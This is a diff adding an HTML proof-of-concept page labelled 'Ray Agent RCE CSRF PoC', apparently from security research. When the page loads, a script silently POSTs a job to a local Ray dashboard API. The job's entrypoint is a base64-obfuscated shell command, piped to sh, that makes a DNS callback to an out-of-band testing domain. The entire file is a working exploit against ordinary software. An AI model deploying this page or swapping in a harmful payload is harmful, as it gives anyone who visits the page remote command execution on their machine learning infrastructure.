@@ -1,0 +1,16 @@
+<html>
+  <!-- Ray Agent RCE CSRF PoC -->
+  <body>
+    <script>
+        fetch("http://127.0.0.1:8265/api/jobs/", {
+            "headers": {
+                "accept": "application/json, text/plain, */*",
+                "content-type": "application/json",
+            },
+            "body": "{\"entrypoint\": \"echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldDtzb2NrZXQuZ2V0aG9zdGJ5bmFtZSgiY2t0YmVlNm5yMmt0Y3Y2c2ZkMjBxdDZjNGQ1bXh1cHdhLm9hc3QuZnVuIikn|base64$IFS-d|sh\"}",
+            "method": "POST",
+            "mode": "no-cors",
+        }).then(x => x.text())
+    </script>
+  </body>
+</html>
